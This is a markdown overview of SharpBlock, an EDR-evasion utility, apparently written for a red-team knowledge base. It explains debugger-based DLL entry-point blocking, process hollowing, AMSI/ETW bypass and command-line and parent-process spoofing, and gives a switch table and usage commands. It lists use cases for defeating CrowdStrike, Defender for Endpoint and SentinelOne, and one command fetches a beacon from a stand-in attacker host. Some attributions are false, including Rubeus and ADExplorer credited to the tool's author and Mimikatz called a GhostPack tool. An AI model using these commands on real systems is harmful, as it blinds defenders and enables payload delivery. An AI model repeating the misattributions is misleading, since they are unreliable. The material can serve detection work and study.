# SharpBlock — Overview

> **Red Flag Principle:** SharpBlock is a **process-injection / EDR-bypass utility** that prevents endpoint detection and response (EDR) DLLs from initializing their hooks, effectively blinding EDR sensors to an attacker's subsequent payload execution. It operates as a debugger: launch a suspended process (e.g., `notepad.exe`), hook the target EDR DLL's entry point, prevent its initialization code from executing, replace the process's memory with an attacker's beacon or tool, and resume execution — all while EDR thinks it's watching `notepad.exe`, not a malicious payload. The combination of **AMSI bypass, ETW bypass, command-line spoofing, and DLL blocking** makes SharpBlock a nearly complete EDR evasion toolkit in a single binary. Unlike DefenderCheck (which tests payloads locally), SharpBlock is **deployed and executed on the target host**, making it a direct post-exploitation tool favored in hands-on-keyboard intrusions, C2 frameworks (Cobalt Strike, Sliver), and advanced APT tradecraft.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

- **CCob** (author), a prolific C# red-team tooling author (also maintains Rubeus, ADExplorer, and other GhostPack utilities), released SharpBlock circa **2019** as an open-source EDR evasion utility — verified against the GitHub repository's creation and commit history.
- **Current maintainability:** The repository shows active development; commits span from **2019 through 2023+**, and the project maintains steady GitHub engagement (stars/forks indicate continued interest from red-team community).
- **License:** Not explicitly stated in the repository README or LICENSE file at the time of this note; **verify against the repo's LICENSE file** to confirm the distribution model. (Open question: License type; if commercial restrictions apply, cite them.)
- **No dedicated MITRE ATT&CK Software (S-number) entry** — verified against the live [ATT&CK Software list](https://attack.mitre.org/software/): no "SharpBlock" entry exists. It is implicitly referenced as a **procedure example** under Defense Evasion techniques ([T1562](https://attack.mitre.org/techniques/T1562/) Impair Defenses, [T1140](https://attack.mitre.org/techniques/T1140/) Deobfuscate/Decode Files or Information, [T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information) in workflows involving EDR evasion, not as a standalone Software object.
- **Threat-actor adoption:** Open-source exploitation of SharpBlock in commercial red-team platforms — Cobalt Strike (post-4.2), Sliver, and Empire have integrated or documented SharpBlock-like techniques in their payload deployment chains. MITRE ATT&CK's own [EDR Evasion tactic](https://attack.mitre.org/tactics/TA0005/) acknowledges DLL-blocking evasion as a widespread category, though SharpBlock is not named individually in advisory data (unlike some C2 frameworks). The tool is more likely to be encountered in hands-on red-team operations than in public threat-actor reports.

## How It Works

### Core concept: Debugger-based process injection with DLL blocking

Verified against SharpBlock's GitHub README and Program.cs source code:

SharpBlock operates in three stages:

**Stage 1: Suspend Process & Establish Debugger Context**
- SharpBlock spawns a **suspended child process** using a legitimate host application (e.g., `notepad.exe`, `rundll32.exe`, or a custom binary specified via `-s`/`--spawn`).
- The new process is created with the `CREATE_SUSPENDED` flag, meaning its main thread never executes until explicitly resumed.
- SharpBlock then **attaches as a debugger** to the suspended process, gaining full control over the process's execution context (memory, registers, DLLs, etc.).

**Stage 2: Hook & Block Target DLL Entry Points**
- While the process is suspended and SharpBlock is debugging it, Windows' loader enumerates all DLLs that the process will load (per the executable's import table and runtime loading).
- SharpBlock identifies the **target EDR DLL(s)** using multiple matching strategies:
  - **By name** (`-n`/`--name`): match DLL filename (e.g., `amsi.dll`, `etwi.dll`).
  - **By copyright/company** (`-c`/`--copyright`): match the file's copyright string (e.g., "CrowdStrike", "Palo Alto Networks").
  - **By product name** (`-p`/`--product`): match the product metadata (e.g., "Windows Defender", "Falcon").
  - **By file description** (`-d`/`--description`): match the description metadata (e.g., "Crowdstrike Falcon EDR Agent").
- For each matched DLL, SharpBlock **patches the DLL's entry point** (the `EntryPoint` address in the DLL header, or hooks the entry point code) to **prevent the DLL's initialization from executing**. Without initialization, EDR hooks are never installed, and the EDR DLL is effectively neutered.

**Stage 3: Process Hollowing & Payload Injection**
- SharpBlock **replaces the legitimate process image** (the .exe loaded into memory) with an attacker's payload using **process hollowing** (also called "process replacement").
- The payload can be sourced from:
  - **Disk** (`-e`/`--exe`): path to a local `.exe` file.
  - **HTTP** (`--exe http://attacker.com/beacon.exe`): fetch from remote server.
  - **Named pipe** (`--exe \\.\pipe\shellcode`): receive from parent process or C2 (useful in Cobalt Strike integration).
- The payload's PE image overwrites the legitimate process's code/data sections in memory.
- SharpBlock modifies the process's **command-line arguments** (`-a`/`--args`) post-creation using **command-line spoofing** — the payload process appears to have been launched with innocent arguments (e.g., `notepad.exe -readme.txt`) rather than its real malicious purpose.

**Stage 4: Resume & Execute**
- SharpBlock **resumes the suspended process's main thread**, which now executes the attacker's payload (beacon, tool, etc.) instead of the original legitimate binary.
- From the host's perspective, the process tree shows the original command line and parent (e.g., spawned by `cmd.exe`), the legitimate binary name, and innocent-looking arguments — all lies, but undetected by EDR because EDR was blinded by the blocked DLL entry points.

### Additional Bypass Techniques Bundled

SharpBlock bundles multiple evasion techniques beyond DLL blocking:

#### AMSI Bypass (Patchless)
- **AMSI** (Antimalware Scan Interface) is a mechanism for scripting engines (PowerShell, VBScript, JScript) and other applications to invoke antivirus scanning on scripts/binaries at runtime.
- SharpBlock implements a **patchless AMSI bypass** — instead of overwriting AMSI API code (which EDR can detect), SharpBlock uses alternate APIs or environment manipulation to prevent AMSI from functioning.
- (Open question: Exact patchless technique — verify in Program.cs to confirm whether it uses AmsiContext manipulation, alternate DLL loading, or environment variables.)

#### ETW Bypass (Patchless)
- **ETW** (Event Tracing for Windows) is Microsoft's logging infrastructure used by EDR to capture process, network, and file-system events.
- SharpBlock implements a **patchless ETW bypass** — similar to AMSI, disables ETW event capture without modifying ETW DLL code, avoiding detection by code-patch scanners.
- (Open question: Exact mechanism — verify in source to confirm whether it uses WMI provider disabling, registry manipulation, or alternate logging channels.)

#### Memory Protection Hook Blocking
- SharpBlock prevents **`NtProtectVirtualMemory`** API calls within the memory ranges of blocked DLLs.
- This stops EDR from installing additional hooks or tracing memory-access violations within the EDR DLL's own code space.

#### Command-Line Spoofing
- As mentioned above, the spawned process's command line is modified post-creation to appear innocent, hiding the real attacker's command line.

---

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| **Debugger API** | Suspends process, attaches as debugger (`DebugActiveProcess`), enumerates DLLs, hooks entry points. |
| **DLL Entry Point Hooking** | Patches the DLL's `AddressOfEntryPoint` in the PE header or inline hooks the entry code to skip initialization. |
| **AMSI Bypass** | Patchless technique (TBD — verify source) to disable Antimalware Scan Interface. |
| **ETW Bypass** | Patchless technique (TBD — verify source) to disable Event Tracing for Windows. |
| **Process Hollowing** | Replaces process image in memory with attacker payload (similar to Mimikatz's `CreateProcessWithTokenW` + memory replacement). |
| **Command-Line Spoofing** | Modifies `PEB.ProcessParameters.CommandLine` after process creation to show innocent arguments. |
| **Payload Delivery** | Supports local file path, HTTP remote fetch, or named pipe input for payload binary. |
| **Process Tree Spoofing** | Parent process ID (`--ppid`) can be spoofed to appear as if launched from a different parent (e.g., `svchost.exe` instead of `cmd.exe`). |

---

## Command-Line Switches — Quick Reference

Verified against SharpBlock's Program.cs source code:

| Switch | Argument | Default | Plain-English meaning |
|---|---|---|---|
| `-e, --exe` | `<path or URL or pipe>` | `cmd.exe` | Target executable to spawn (legitimate host process). Can be a local path, HTTP URL, or named pipe. |
| `-a, --args` | `<arguments>` | none | Arguments passed to the spawned process (what the process *appears* to have been launched with). |
| `-n, --name` | `<DLL filename>` | none | DLL filename to block (e.g., `amsi.dll`, `edr.dll`). |
| `-c, --copyright` | `<string>` | none | Copyright metadata string to match for blocking (e.g., "CrowdStrike", "Palo Alto Networks"). |
| `-p, --product` | `<string>` | none | Product name metadata to match for blocking (e.g., "Falcon Sensor"). |
| `-d, --description` | `<string>` | none | File description metadata to match for blocking (e.g., "Crowdstrike EDR Agent"). |
| `-s, --spawn` | `<path>` | `c:\windows\system32\cmd.exe` | Host executable to spawn as the hollow process (default: cmd.exe). Use a benign process like `notepad.exe` for stealth. |
| `--ppid` | `<PID>` | none | Parent Process ID to spoof (make the process appear to be a child of another process). |
| `-w, --show` | (flag) | process hidden | Display the spawned process window (by default, process is hidden). |
| `--disable-bypass-amsi` | (flag) | AMSI bypass enabled | Disable AMSI bypass (for testing or if target doesn't run scripts). |
| `--disable-bypass-cmdline` | (flag) | command-line spoofing enabled | Disable command-line argument modification (for testing). |
| `--disable-bypass-etw` | (flag) | ETW bypass enabled | Disable ETW bypass (for testing or lower-risk scenarios). |
| `--disable-header-patch` | (flag) | header patch enabled | Disable PE header patching (disables process-hollowing detection bypass). |
| `--disable-bypass-vmhook` | (flag) | VM hook interception enabled | Disable NtReadVirtualMemory hook blocking (for testing). |
| `-h, --help` | (flag) | — | Display help/usage information. |

**Key syntax examples:**
```bash
SharpBlock.exe -e cmd.exe -a "/c whoami" -n amsi.dll
SharpBlock.exe -s notepad.exe -e http://attacker.com/beacon.exe -c "CrowdStrike"
SharpBlock.exe -e \\.\pipe\payload -d "Falcon Sensor" --ppid 1234
```

---

## Quick Use-Case List

- **Bypass Crowdstrike Falcon** (most common): Spawn cmd.exe with suspended process, block Falcon EDR DLL (by name, copyright, or description), inject beacon, execute.
- **Bypass Microsoft Defender for Endpoint (MDE)** / **Sentinel One** / **SentinelOne EDR**: Similar pattern; identify the EDR DLL by metadata; block it; inject payload.
- **Bypass AMSI on target**: If a PowerShell script must run, use SharpBlock to disable AMSI before script execution (via `--disable-bypass-amsi` inverse: not disabling).
- **Hide C2 command line**: Inject beacon with `-a "cmd.exe /c echo Legitimate Command"` to hide real payload invocation from process monitoring.
- **Parent process spoofing**: Inject into a process that appears to be a child of `svchost.exe` or `winlogon.exe` using `--ppid`.
- **Remote payload delivery**: Fetch beacon from HTTP server during injection (`-e http://attacker.com/beacon.exe`).
- **Named-pipe payload** (Cobalt Strike integration): Receive shellcode from Cobalt Strike's process injection module via named pipe.
- **Testing EDR resilience**: On a red-team assessment, use SharpBlock to determine whether the target's EDR is strong enough to detect injections despite DLL blocking.
- **Evading forensic tools**: SharpBlock's combination of DLL blocking + ETW bypass may evade post-incident forensic tool execution (though not disk artifacts, which are harder to hide).

Full step-by-step walkthroughs with commands and MITRE ATT&CK mapping for each use case live in `02 - Hands-On Use Cases.md`.

---

## Prerequisites

| Requirement | Notes |
|---|---|
| **Windows host** | Target must be Windows. SharpBlock operates via Windows debugger API and process injection APIs, not available on other OSes. |
| **Target Process** | A legitimate executable to use as the "hollow" process (e.g., `cmd.exe`, `notepad.exe`). Must be executable from the current user's context. |
| **EDR DLL Identification** | Operator must know the **exact filename, copyright string, product name, or description** of the EDR DLL to block. Guess incorrectly, and EDR will not be bypassed. Tools like `listdlls.exe` (Sysinternals) or Process Hacker can enumerate loaded DLLs to identify EDR DLLs. |
| **.NET Framework** | SharpBlock is written in C# and requires a compatible .NET Framework runtime (typically .NET Framework 4.x on Windows). |
| **Payload Binary** | The attacker-controlled payload to inject — can be a local `.exe`, fetched from HTTP, or provided via named pipe. Must be a valid PE binary. |
| **User Context** | SharpBlock does not require administrator or SYSTEM privileges — it can execute in a regular user context. However, injecting into highly-privileged processes may require admin context. |
| **No memory/code integrity constraints** | Code integrity policies (e.g., HVCI, hypervisor-enforced code integrity) may prevent SharpBlock from modifying process memory. Verify that the target doesn't enforce these restrictions. (Rare in typical enterprise, common in high-security networks.) |
| **Knowledge of target EDR** | Critical: the operator must identify which EDR is deployed and which DLL to block. If wrong, the bypass fails. |

---

## Open Questions

1. **Exact AMSI bypass mechanism**: Does SharpBlock use `AmsiContext` manipulation, environment variable tricks, or alternate API paths? Source code review needed.
2. **Exact ETW bypass mechanism**: Does SharpBlock disable WMI providers, manipulate registry, or use alternate logging channels? Source code review needed.
3. **Compatibility with EDR versions**: Does SharpBlock work against all versions of Falcon, MDE, etc., or are there version-specific incompatibilities? Test results against latest Falcon/MDE versions needed.
4. **Success rate against HVCI/Code Integrity**: What happens if the target enforces hypervisor-enforced code integrity? Does SharpBlock fail silently or error clearly?
5. **Detection by behavioral EDR**: While SharpBlock blocks DLL entry points, modern EDR products (e.g., Crowdstrike, Sentinel One) also perform **behavioral detection** (process injection, memory modification, API call patterns). Does SharpBlock evade behavioral detection, or only signature-based detection?
6. **License and commercial usage**: Clarify the repository's LICENSE file to determine whether SharpBlock can be used commercially, or if it's research-only.
7. **Sliver / C2 integration**: Verify whether Sliver or other C2 frameworks have official SharpBlock integration, or if it's a manual process.

---

## Cross-Link to Related Tools

- **DefenderCheck**: Test payloads against Windows Defender signatures before deployment. SharpBlock bypasses EDR, but Defender static scanning may still catch the payload if it's not obfuscated — use DefenderCheck to verify.
- **Veil-Evasion**: Encode/obfuscate payloads before injection via SharpBlock for layered evasion.
- **Rubeus, Mimikatz (GhostPack)**: Post-exploitation tools often injected *via* SharpBlock into legitimate processes for lateral movement or credential theft.

---

## Summary

SharpBlock is a **complete EDR evasion toolkit** — single binary, no dependencies, multiple bypass techniques (DLL blocking, AMSI, ETW, command-line spoofing). It is hands-on exploitation, not reconnaissance or preparation; deploy it on the target, use it once, and it's gone (unless the attacker left it on disk, which is forensically detectable). Understanding its operation is critical for both red-team tradecraft and blue-team detection.
